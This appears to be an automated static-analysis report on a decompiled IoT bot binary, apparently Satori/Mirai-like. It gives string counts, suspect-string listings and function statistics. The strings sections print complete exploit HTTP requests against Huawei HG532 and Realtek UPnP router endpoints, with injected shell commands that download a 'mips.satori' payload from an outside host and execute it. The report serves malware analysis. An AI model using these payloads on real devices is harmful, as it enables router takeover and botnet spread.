@@ -1,0 +1,880 @@
+=============================================================================
+========	BINARY ID :a2e68c388e93869d4aafaed4b1a29cc235eb8063==================================================
+================================================================================
+================================================================================
+========	STRINGS SUMMARY : =====================================================
+================================================================================
+TOTAL STRINGS COUNT :84
+SUPSCPECTED LINES COUNT :6
+SUPSCPECTED STRINGS COUNT (DISTINCT) :8
+SUPSCPECTED STRINGS WEIGHT :33
+SUSPECT STRING SCORE : [33 / 150] 22%
+USER AGENTS STRINGS COUNT :3
+STATIC IPs STRINGS COUNT :0
+DYNAMIC IPs STRINGS COUNT :0
+================================================================================
+========	STRINGS DETAILS : =====================================================
+================================================================================
+================================================================================
+========	SUSPECTED STRINGS : =====================================================
+================================================================================
+%29 HTTP/1.0\r\n\r\n
+ HTTP/1.0\r\n\r\n
+POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username="dslf-config", realm="HuaweiHomeGateway", nonce="88645cefb1f9ede0e336e3569d75ee30", uri="/ctrlt/DeviceUpgrade_1", response="3612f843a42db38f48f59d2a3597e19c", algorithm="MD5", qop="auth", nc=00000001, cnonce="248d1a2560100669"\r\n\r\n<?xml version="1.0" ?>\r\n    <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\r\n    <s:Body><u:Upgrade xmlns:u="urn:schemas-upnp-org:service:WANPPPConnection:1">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+================================================================================
+========	USER AGENTS STRINGS : =====================================================
+================================================================================
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n
+================================================================================
+========	STATIC IP ADRESSES : =====================================================
+================================================================================
+================================================================================
+========	DYNAMIC IP MASKS : =====================================================
+================================================================================
+================================================================================
+========	/proc FOLDER ACCESS : =====================================================
+================================================================================
+================================================================================
+========	HISTORY TEMPERING : =====================================================
+================================================================================
+================================================================================
+========	AUTOINSTALL COMMANDS : =====================================================
+================================================================================
+================================================================================
+========	FUNCTIONS SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES			: 24888
++++TOTAL FUNCTIONS 			:141
++++LINES PER FUNCTION RATIO 	: 176.510638297872
++++SUSPECTED LINES COUNT 	: 171
++++SUSPECTED LINES RATIO 	: 0.687078109932498
+================================================================================
+========	WHILES SUMMARY : =====================================================
+================================================================================
++++TOTAL FILE LINES				: 24888
++++WHILE (TRUE) LINES			: 4114
++++WHILE (TRUE) LINES RATION		:16.5300546448087%
++++WHILE (TRUE) LOOPS COUNT		: 75
+================================================================================
+========	SYSTEM FILES SUMMARY : ================================================
+================================================================================
+            function_8c80(function_8704((int32_t)"nfig\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n"));
+                        function_b410(v197, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+                                function_b410(v204, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;cp $SHELL %s;>%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v172);
+                        function_b410(v207, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 642\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;wget http://%d.%d.%d.%d/mips.satori -O -> %s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", 185);
+                        function_be20((int32_t)&v212, (int32_t)"\n\r=\" \n\r\"/dev/null", 8);
+                        function_b410(v233, (int32_t)"POST /picdesc.xml HTTP/1.1\r\nHost: 127.0.0.1:52869\r\nContent-Length: 620\r\nAccept-Encoding: gzip, deflate\r\nSOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping\r\nAccept: */*\r\nUser-Agent: Hello-World\r\nConnection: keep-alive\r\n\r\n<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:AddPortMapping xmlns:u=\"urn:schemas-upnp-org:service:WANIPConnection:1\"><NewRemoteHost></NewRemoteHost><NewExternalPort>47450</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`cd /var;chmod +x %s;./%s`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>\r\n\r\n", v172);
+    int32_t result2 = function_b9b0("/dev/null", a2); // 0xce1c
+================================================================================
+========	IP PATTERNS SUMMARY : =================================================
+================================================================================
+            function_8c80(function_8704((int32_t)"nfig\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n"));
+
+                        function_b410(v197, (int32_t)"POST /ctrlt/DeviceUpgrade_1 HTTP/1.1\r\nHost: 127.0.0.1:37215\r\nUser-Agent: Hello-World\r\nContent-Length: 413\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate\r\nAuthorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\"\r\n\r\n<?xml version=\"1.0\" ?>\r\n    <s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\">\r\n    <s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\">\r\n    <NewStatusURL>$(/bin/busybox wget -g %d.%d.%d.%d -l /tmp/.f -r /g/h;sh /tmp/.f)</NewStatusURL>\r\n<NewDownloadURL></NewDownloadURL>\r\n</u:Upgrade>\r\n    </s:Body>\r\n    </s:Envelope>\r\n\r\n", 185);
+
+================================================================================
+========	SYSTEM CALLS SUMMARY : ================================================
+================================================================================
+================================================================================
+========	FUNCTIONS LIST : =======================================================
+================================================================================
+FUNCTION_NAME                                     |ARGS|LENGH   |SUSPCET_INSTRC|WHILE_INSTRC|
+----------------------------------------------------------------------------------------------
+function_9ba0                                     |1   |1557    |38            |228         |
+----------------------------------------------------------------------------------------------
+function_daa0                                     |0   |2374    |35            |1045        |
+----------------------------------------------------------------------------------------------
+function_8704                                     |1   |615     |9             |429         |
+----------------------------------------------------------------------------------------------
+function_8de4                                     |3   |414     |8             |83          |
+----------------------------------------------------------------------------------------------
+function_94a0                                     |1   |416     |6             |270         |
+----------------------------------------------------------------------------------------------
+function_b4cc                                     |0   |463     |4             |212         |
+----------------------------------------------------------------------------------------------
+function_b5dc                                     |2   |495     |4             |350         |
+----------------------------------------------------------------------------------------------
+function_b6a8                                     |2   |560     |4             |376         |
+----------------------------------------------------------------------------------------------
+function_8c80                                     |1   |166     |4             |61          |
+----------------------------------------------------------------------------------------------
+function_bee0                                     |5   |111     |3             |0           |
+----------------------------------------------------------------------------------------------
+function_abc4                                     |2   |232     |3             |82          |
+----------------------------------------------------------------------------------------------
+function_c0a8                                     |3   |111     |3             |0           |
+----------------------------------------------------------------------------------------------
+function_ac84                                     |3   |223     |3             |29          |
+----------------------------------------------------------------------------------------------
+function_adb4                                     |2   |337     |3             |150         |
+----------------------------------------------------------------------------------------------
+function_81cc                                     |1   |176     |2             |66          |
+----------------------------------------------------------------------------------------------
+function_82cc                                     |1   |176     |2             |66          |
+----------------------------------------------------------------------------------------------
+function_d63c                                     |4   |142     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_af7c                                     |1   |115     |2             |0           |
+----------------------------------------------------------------------------------------------
+function_b234                                     |10  |321     |2             |196         |
+----------------------------------------------------------------------------------------------
+function_be40                                     |2   |227     |2             |74          |
+----------------------------------------------------------------------------------------------
+function_d328                                     |0   |173     |2             |46          |
+----------------------------------------------------------------------------------------------
+function_a9e0                                     |2   |180     |2             |32          |
+----------------------------------------------------------------------------------------------
+function_b448                                     |3   |191     |2             |48          |
+----------------------------------------------------------------------------------------------
+function_83d0                                     |1   |124     |1             |15          |
+----------------------------------------------------------------------------------------------
+function_b984                                     |2   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_c04c                                     |4   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_b900                                     |0   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_b9b0                                     |2   |116     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_b92c                                     |0   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_ad54                                     |4   |135     |1             |20          |
+----------------------------------------------------------------------------------------------
+function_bf38                                     |4   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_bf90                                     |5   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_bfec                                     |4   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_d218                                     |3   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_bf64                                     |4   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_aee8                                     |3   |129     |1             |24          |
+----------------------------------------------------------------------------------------------
+function_ce8c                                     |7   |333     |1             |23          |
+----------------------------------------------------------------------------------------------
+function_b880                                     |1   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_b114                                     |0   |198     |1             |15          |
+----------------------------------------------------------------------------------------------
+function_c494                                     |2   |161     |1             |41          |
+----------------------------------------------------------------------------------------------
+function_bf0c                                     |4   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_b8ac                                     |0   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_c078                                     |5   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_bd04                                     |1   |149     |1             |33          |
+----------------------------------------------------------------------------------------------
+function_c018                                     |6   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_bfc0                                     |2   |111     |1             |0           |
+----------------------------------------------------------------------------------------------
+function_c650                                     |0   |171     |1             |4           |
+----------------------------------------------------------------------------------------------
+function_9934                                     |3   |130     |1             |28          |
+----------------------------------------------------------------------------------------------
+function_c55c                                     |3   |181     |1             |68          |
+----------------------------------------------------------------------------------------------
+function_b958                                     |2   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ce30                                     |1   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_aba4                                     |3   |116     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c548                                     |0   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_df30                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c1b0                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8094                                     |0   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8c78                                     |3   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9444                                     |0   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ab2c                                     |2   |134     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bad0                                     |1   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c798                                     |1   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9b68                                     |0   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d5e4                                     |1   |148     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bb54                                     |1   |129     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bde0                                     |1   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_93f4                                     |2   |121     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_df6c                                     |1   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_84b4                                     |1   |129     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ab0c                                     |0   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d9cc                                     |2   |104     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c0d4                                     |2   |141     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b78c                                     |0   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d6bc                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8410                                     |0   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9b20                                     |2   |115     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d1f0                                     |1   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ab78                                     |2   |113     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_86f0                                     |1   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b804                                     |0   |112     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_80b0                                     |0   |122     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c1d4                                     |2   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_dfa8                                     |1   |117     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bafc                                     |1   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_baa4                                     |1   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c3a4                                     |1   |164     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c1f8                                     |1   |194     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ab58                                     |3   |116     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bdd4                                     |0   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_be20                                     |3   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ba74                                     |5   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_af74                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c18c                                     |2   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c9d0                                     |1   |109     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d1c4                                     |1   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ba1c                                     |3   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bc08                                     |1   |151     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d294                                     |4   |126     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d48c                                     |0   |112     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c528                                     |0   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8444                                     |3   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c34c                                     |2   |125     |0             |0           |
+----------------------------------------------------------------------------------------------
+entry_point                                       |2   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9b00                                     |0   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d510                                     |0   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d554                                     |4   |119     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b010                                     |2   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ba0c                                     |1   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_c82c                                     |1   |201     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_cd80                                     |1   |114     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b854                                     |1   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_be30                                     |3   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_bb28                                     |3   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d528                                     |0   |112     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_a944                                     |2   |107     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b054                                     |4   |564     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d5b8                                     |3   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9920                                     |1   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_939c                                     |0   |107     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_cdf8                                     |2   |119     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b410                                     |3   |105     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d4e4                                     |1   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8188                                     |0   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d690                                     |2   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8124                                     |1   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_da98                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d0d8                                     |3   |139     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_9a20                                     |2   |133     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b790                                     |2   |119     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_a9cc                                     |1   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d4b8                                     |0   |112     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_ba48                                     |3   |111     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_dfe4                                     |0   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_cdec                                     |0   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_cdf4                                     |7   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_d244                                     |0   |115     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_df28                                     |1   |101     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_df48                                     |1   |103     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_8130                                     |0   |106     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_dfdc                                     |0   |102     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_b8d8                                     |0   |108     |0             |0           |
+----------------------------------------------------------------------------------------------
+function_af48                                     |0   |110     |0             |0           |
+----------------------------------------------------------------------------------------------
+================================================================================
+========	FUNCTIONS SUSPECTED INSTRUNCTIONS : ===================================
+================================================================================
+=================FUNCTION : function_9ba0 ===================
+++++++++ FUNCTION START 4611
+++++++++ FUNCTION END 6168
+++++++++ FUNCTION LENGTH 1557
+                if (function_c04c(v170, (int32_t *)"GET login.cgi\r\n\r\n", 17, 0x4000) < 1) {
+                    case 0: {
+                            while (true) {
+                        if (function_bf38(v178, (struct sockaddr *)&v176, 16) == -1) {
+                    case 1: {
+                        while (true) {
+                    case 2: {
+                    case 3: {
